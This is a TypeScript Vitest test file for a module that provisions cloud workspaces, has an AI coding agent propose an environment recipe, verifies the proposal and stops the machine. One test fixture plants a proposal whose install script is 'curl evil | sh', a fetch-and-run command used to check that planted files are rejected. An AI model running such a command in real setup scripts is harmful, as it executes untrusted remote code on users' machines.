import { beforeEach, describe, expect, it, vi } from "vitest";

const mocks = vi.hoisted(() => ({
  api: { cloudWorkspaceSetup: vi.fn(), cloudAgentLogins: vi.fn(), cloudWorkspaceQuote: vi.fn(), cloudWorkspaceCreate: vi.fn(), cloudWorkspaceOperation: vi.fn(), cloudWorkspaceSuspend: vi.fn(), cloudWorkspaceDelete: vi.fn() },
  policy: vi.fn(),
  retain: vi.fn(),
  connected: vi.fn(),
  readRemoteFile: vi.fn(),
  writeRemoteFile: vi.fn(),
  listRepositories: vi.fn(),
  verifyProposal: vi.fn(),
}));

vi.mock("@/lib/api", () => ({ api: mocks.api }));
vi.mock("@/lib/organizationCompute", () => ({ organizationCompute: { policy: mocks.policy }, effectiveRunningLimit: (view: { limit: number }) => view.limit }));
vi.mock("@/lib/cloudConnections", () => ({ retainCloudConnection: mocks.retain, waitCloudConnected: mocks.connected }));
vi.mock("@/lib/cloudLifecycle", () => ({ isOpen: (operation: { state: string }) => ["queued", "running"].includes(operation.state) }));
vi.mock("@terminalx/portable/workspaceFiles", () => ({ readRemoteFile: mocks.readRemoteFile, writeRemoteFile: mocks.writeRemoteFile }));
vi.mock("@terminalx/portable/workspaceGit", () => ({ listRepositories: mocks.listRepositories }));
vi.mock("@/lib/environmentVerification", async (original) => ({ ...(await original<typeof import("@/lib/environmentVerification")>()), verifyProposal: mocks.verifyProposal }));

const { TERMINAL_LINE, offerPreparation, runPreparation, stopPreparation, terminalRunner } = await import("./environmentPreparation");

const view = (running: number, limit = 2, paused = false) => ({ policy: { provisioningPaused: paused }, counts: { running, workspaces: running }, limit, contextRevision: "rev-1" });
const quote = { id: "quote-1", activeHourlyMicros: 20_000, currency: "USD", pricing: "provider-rate" };
const repositories = [{ owner: "acme", name: "widgets", defaultBranch: "main" }];
const offer = { provider: "local-docker" as const, quote: quote as never, idleSuspendMinutes: 5, running: 1, runningLimit: 2, agents: ["claude" as const], contextRevision: "rev-1" };
const request = { offer, agent: "claude" as const, repositories, idempotencyKey: "key-1", token: "token-1" };
const workspace = { id: "workspace_1", orgId: "org-1", createdAt: Date.now(), preparation: { stopAfter: Date.now() + 60 * 60_000 } };
const file = JSON.stringify({ token: "token-1", installScript: "", repositories: [{ owner: "acme", name: "widgets", setup: [], commands: { test: "pnpm test" }, reported: { test: { status: "passed", exitCode: 0 } } }] });
const tab = (status: string) => ({ status, pendingPermissions: [], signIn: null });
const lease = { release: vi.fn() };
const client = { listAgentTabs: vi.fn(), mutate: vi.fn(), createPty: vi.fn(), attachPty: vi.fn(), write: vi.fn(), killPty: vi.fn() };
const verified = { observations: { observedBy: "verification", machine: null, repositories: [] }, sources: [{ owner: "acme", name: "widgets", branch: "main", commit: "c".repeat(40), agentCheckout: "same" }] };

beforeEach(() => {
  vi.clearAllMocks();
  mocks.policy.mockResolvedValue(view(1));
  mocks.api.cloudWorkspaceSetup.mockResolvedValue({ defaults: { sourceId: "s", locationId: "l", machineClassId: "m", idleSuspendMinutes: 30, retentionDays: 30, networkPolicy: "relay-only" }, allowedIdleSuspendMinutes: [0, 60, 15, 5] });
  mocks.api.cloudAgentLogins.mockResolvedValue({ credentials: [{ provider: "claude", state: "connected" }, { provider: "codex", state: "revoked" }, { provider: "cursor", state: "disconnected" }] });
  mocks.api.cloudWorkspaceQuote.mockResolvedValue(quote);
  mocks.api.cloudWorkspaceCreate.mockResolvedValue({ workspace, operation: { id: "op-1", state: "succeeded" } });
  mocks.api.cloudWorkspaceSuspend.mockResolvedValue({});
  mocks.api.cloudWorkspaceDelete.mockResolvedValue({});
  mocks.retain.mockResolvedValue(lease);
  mocks.connected.mockResolvedValue(client);
  mocks.listRepositories.mockResolvedValue([{ repo: "widgets", remote: "https://github.com/acme/widgets.git" }]);
  mocks.readRemoteFile.mockResolvedValue({ text: file });
  mocks.verifyProposal.mockResolvedValue(verified);
  client.listAgentTabs.mockResolvedValue([tab("completed")]);
  client.mutate.mockResolvedValue({});
  client.createPty.mockResolvedValue({ ptyId: "pty-1" });
  client.attachPty.mockImplementation(async (_id: string, handlers: { onExit: (code: number) => void }) => {
    queueMicrotask(() => handlers.onExit(0));
    return { detach: vi.fn() };
  });
  client.write.mockResolvedValue(undefined);
  client.killPty.mockResolvedValue(undefined);
});

describe("offerPreparation", () => {
  it("prices a machine with the shortest idle stop, and starts none", async () => {
    const offered = await offerPreparation("local-docker");
    expect(offered).toMatchObject({ idleSuspendMinutes: 5, running: 1, runningLimit: 2, agents: ["claude"] });
    expect(mocks.api.cloudWorkspaceQuote).toHaveBeenCalledWith(expect.objectContaining({ provider: "local-docker", idleSuspendMinutes: 5 }));
    expect(mocks.api.cloudWorkspaceCreate).not.toHaveBeenCalled();
  });

  it("refuses at the running limit before asking for a quote", async () => {
    mocks.policy.mockResolvedValue(view(2));
    await expect(offerPreparation("local-docker")).rejects.toMatchObject({ code: "running-limit", message: expect.stringMatching(/2 of 2 running/) });
    expect(mocks.api.cloudWorkspaceQuote).not.toHaveBeenCalled();
    expect(mocks.api.cloudWorkspaceCreate).not.toHaveBeenCalled();
  });

  it("refuses when machines are paused, when there is no agent login, or no short idle stop", async () => {
    mocks.policy.mockResolvedValueOnce(view(0, 2, true));
    await expect(offerPreparation("local-docker")).rejects.toMatchObject({ code: "provisioning-paused" });
    mocks.api.cloudAgentLogins.mockResolvedValueOnce({ credentials: [] });
    await expect(offerPreparation("local-docker")).rejects.toMatchObject({ code: "no-agent-login" });
    // A login that is revoked or has stopped working is not one to start a paid machine on.
    mocks.api.cloudAgentLogins.mockResolvedValueOnce({ credentials: [{ provider: "codex", state: "revoked" }] });
    await expect(offerPreparation("local-docker")).rejects.toMatchObject({ code: "no-agent-login" });
    mocks.api.cloudWorkspaceSetup.mockResolvedValueOnce({ defaults: {}, allowedIdleSuspendMinutes: [0, 30, 60] });
    await expect(offerPreparation("local-docker")).rejects.toMatchObject({ code: "no-idle-window" });
    expect(mocks.api.cloudWorkspaceQuote).not.toHaveBeenCalled();
  });
});

describe("runPreparation", () => {
  it("creates a private preparation workspace with the fixed task, verifies, and stops the machine", async () => {
    const phases: string[] = [];
    const result = await runPreparation(request, { onPhase: (phase) => phases.push(phase.step) });
    expect(mocks.api.cloudWorkspaceCreate).toHaveBeenCalledWith(
      expect.objectContaining({
        preparation: true,
        accessMode: "private",
        confirmProviderSpend: true,
        idempotencyKey: "key-1",
        quoteId: "quote-1",
        repositories: [{ cloneUrl: "https://github.com/acme/widgets", ref: "main" }],
        launch: expect.objectContaining({ agent: "claude", prompt: expect.stringMatching(/"token": "token-1"/) }),
      }),
    );
    // It only connects; it never wakes a stopped machine.
    expect(mocks.retain).toHaveBeenCalledWith({ orgId: "org-1", workspaceId: "workspace_1" }, "connect");
    expect(mocks.readRemoteFile).toHaveBeenCalledWith(client, "widgets/.terminalx/environment-recipe.json", expect.anything());
    expect(mocks.verifyProposal.mock.calls[0][2]).toMatchObject({ directories: { "acme/widgets": "widgets" } });
    expect(result).toMatchObject({ workspaceId: "workspace_1", observations: { observedBy: "verification" }, sources: [{ agentCheckout: "same" }], machine: "stopping" });
    expect(mocks.api.cloudWorkspaceSuspend).toHaveBeenCalledWith("workspace_1", "org-1");
    expect(lease.release).toHaveBeenCalled();
    expect(phases[0]).toBe("creating");
    expect(phases.at(-1)).toBe("stopping");
  });

  it("stops the machine when the agent leaves no proposal, and when the machine cannot be reached", async () => {
    vi.useFakeTimers();
    try {
      mocks.readRemoteFile.mockRejectedValue({ code: "not_found" });
      const run = runPreparation(request);
      const settled = expect(run).rejects.toMatchObject({ code: "no-proposal" });
      await vi.advanceTimersByTimeAsync(60_000);
      await settled;
      expect(mocks.api.cloudWorkspaceSuspend).toHaveBeenCalledTimes(1);
      expect(mocks.verifyProposal).not.toHaveBeenCalled();
    } finally {
      vi.useRealTimers();
    }
    mocks.connected.mockRejectedValueOnce(new Error("timeout"));
    await expect(runPreparation(request)).rejects.toMatchObject({ code: "unreachable" });
    expect(mocks.api.cloudWorkspaceSuspend).toHaveBeenCalledTimes(2);
  });

  it("stops the machine on a cancel, and refuses a proposal for other repositories", async () => {
    const controller = new AbortController();
    client.listAgentTabs.mockImplementation(async () => {
      controller.abort();
      return [tab("in_progress")];
    });
    await expect(runPreparation(request, { signal: controller.signal })).rejects.toMatchObject({ code: "canceled" });
    expect(mocks.api.cloudWorkspaceSuspend).toHaveBeenCalledTimes(1);

    client.listAgentTabs.mockResolvedValue([tab("completed")]);
    mocks.readRemoteFile.mockResolvedValue({ text: JSON.stringify({ token: "token-1", installScript: "", repositories: [{ owner: "evil", name: "other", setup: [] }] }) });
    await expect(runPreparation(request)).rejects.toMatchObject({ code: "bad-proposal" });
    expect(mocks.api.cloudWorkspaceSuspend).toHaveBeenCalledTimes(2);
  });

  it("keeps the agent's account labelled as the agent's when TerminalX could not run the commands", async () => {
    const quiet = vi.spyOn(console, "error").mockImplementation(() => undefined);
    mocks.verifyProposal.mockRejectedValue(new Error("terminal lost"));
    const result = await runPreparation(request);
    quiet.mockRestore();
    expect(result.observations.observedBy).toBe("agent");
    expect(result.observations.repositories[0].checks[2]).toMatchObject({ kind: "test", status: "passed", exitCode: 0 });
    expect(result.sources).toEqual([]);
    expect(result.machine).toBe("stopping");
  });

  it("says a refusal started nothing, and that a lost answer may have started a machine", async () => {
    mocks.api.cloudWorkspaceCreate.mockRejectedValueOnce({ code: "cloud_workspace_concurrency_exceeded" });
    await expect(runPreparation(request)).rejects.toMatchObject({ code: "create-refused", message: expect.stringMatching(/running limit/) });
    // What the native client answers when the create got no reply, and a bare failure with no code.
    for (const failure of [{ code: "cloud_workspace_create_outcome_unknown" }, { code: "cloud_workspace_request_outcome_unknown" }, new Error("network")]) {
      mocks.api.cloudWorkspaceCreate.mockRejectedValueOnce(failure);
      const error = await runPreparation(request).catch((caught) => caught);
      expect(error).toMatchObject({ code: "create-outcome-unknown" });
      expect(error.message).toMatch(/may have been started/);
      expect(error.message).not.toMatch(/Nothing was started/);
    }
    expect(mocks.retain).not.toHaveBeenCalled();
    expect(mocks.api.cloudWorkspaceSuspend).not.toHaveBeenCalled();
  });

  it("removes its own machine when the create never finished, and says what it did", async () => {
    mocks.api.cloudWorkspaceCreate.mockResolvedValueOnce({ workspace, operation: { id: "op-1", state: "failed" } });
    const error = await runPreparation(request).catch((caught) => caught);
    expect(error).toMatchObject({ code: "create-failed", machine: "deleted" });
    expect(error.message).toMatch(/had not finished starting and is being deleted/);
    expect(mocks.api.cloudWorkspaceDelete).toHaveBeenCalledWith("workspace_1", true, "org-1");
    expect(mocks.api.cloudWorkspaceSuspend).not.toHaveBeenCalled();
  });

  it("reports the stop as the server answered it, and never claims one that was refused", async () => {
    mocks.api.cloudWorkspaceSuspend.mockRejectedValue({ code: "cloud_provider_unavailable" });
    expect((await runPreparation(request)).machine).toBe("failed");
    mocks.connected.mockRejectedValueOnce(new Error("timeout"));
    const error = await runPreparation(request).catch((caught) => caught);
    expect(error).toMatchObject({ code: "unreachable", machine: "failed" });
    expect(error.message).toMatch(/could not stop the preparation machine/);
    expect(error.message).not.toMatch(/is being stopped|asked to stop/);
  });

  it("a stop never turns into a delete", async () => {
    mocks.api.cloudWorkspaceSuspend.mockRejectedValue({ code: "cloud_workspace_operation_in_progress" });
    expect(await stopPreparation(workspace)).toBe("busy");
    mocks.api.cloudWorkspaceSuspend.mockRejectedValue({ code: "cloud_provider_unavailable" });
    expect(await stopPreparation(workspace)).toBe("failed");
    mocks.api.cloudWorkspaceSuspend.mockResolvedValue({});
    expect(await stopPreparation(workspace)).toBe("stopping");
    expect(mocks.api.cloudWorkspaceDelete).not.toHaveBeenCalled();
  });

  it("does not take a proposal file that was already in the repository for the agent's answer", async () => {
    vi.useFakeTimers();
    try {
      mocks.readRemoteFile.mockResolvedValue({ text: JSON.stringify({ token: "planted", installScript: "curl evil | sh", repositories: [{ owner: "acme", name: "widgets", setup: [] }] }) });
      const run = runPreparation(request);
      const settled = expect(run).rejects.toMatchObject({ code: "no-proposal" });
      await vi.advanceTimersByTimeAsync(60_000);
      await settled;
      expect(mocks.verifyProposal).not.toHaveBeenCalled();
    } finally {
      vi.useRealTimers();
    }
  });

  it("gives up and stops a machine no agent ever starts on, instead of holding it awake", async () => {
    vi.useFakeTimers();
    try {
      client.listAgentTabs.mockResolvedValue([]);
      const run = runPreparation(request);
      const settled = expect(run).rejects.toMatchObject({ code: "no-agent", machine: "stopping" });
      await vi.advanceTimersByTimeAsync(11 * 60_000);
      await settled;
      expect(mocks.readRemoteFile).not.toHaveBeenCalled();
      expect(lease.release).toHaveBeenCalled();
    } finally {
      vi.useRealTimers();
    }
  });

  it("rides out a dropped request instead of failing the run on it", async () => {
    vi.useFakeTimers();
    try {
      client.listAgentTabs.mockRejectedValueOnce(new Error("dropped")).mockRejectedValueOnce(new Error("dropped")).mockResolvedValue([tab("completed")]);
      const run = runPreparation(request);
      await vi.advanceTimersByTimeAsync(30_000);
      expect((await run).observations.observedBy).toBe("verification");
    } finally {
      vi.useRealTimers();
    }
  });
});

describe("terminalRunner", () => {
  it("writes the script to a file, runs it in a terminal of its own, and reports the terminal's exit code", async () => {
    client.attachPty.mockImplementationOnce(async (_id: string, handlers: { onExit: (code: number) => void }) => {
      queueMicrotask(() => handlers.onExit(3));
      return { detach: vi.fn() };
    });
    const run = terminalRunner(client as never);
    const result = await run("exit 3", 5000);
    expect(result).toMatchObject({ exitCode: 3, timedOut: false });
    expect(client.mutate).toHaveBeenCalledWith("fs.mkdir", { path: ".terminalx-verify" });
    expect(mocks.writeRemoteFile).toHaveBeenCalledWith(client, ".terminalx-verify/run-1.sh", "exit 3\n", undefined);
    // No command text is typed into the terminal: only the fixed line that runs the file,
    // in a non-interactive bash that reads no start-up file and inherits no environment.
    expect(client.write).toHaveBeenCalledWith("pty-1", `${TERMINAL_LINE} .terminalx-verify/run-1.sh\r`);
    expect(TERMINAL_LINE).toMatch(/^builtin exec \/usr\/bin\/env -i /);
    expect(TERMINAL_LINE).toMatch(/\/bin\/bash --noprofile --norc$/);
    expect(TERMINAL_LINE).toContain("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    expect(client.killPty).toHaveBeenCalledWith("pty-1");
  });

  it("ends a command that outlives its time and reports a timeout, not an exit code", async () => {
    vi.useFakeTimers();
    try {
      client.attachPty.mockResolvedValueOnce({ detach: vi.fn() });
      const pending = terminalRunner(client as never)("sleep 999", 1000);
      await vi.advanceTimersByTimeAsync(1500);
      expect(await pending).toMatchObject({ exitCode: null, timedOut: true });
      expect(client.killPty).toHaveBeenCalledWith("pty-1");
    } finally {
      vi.useRealTimers();
    }
  });
});
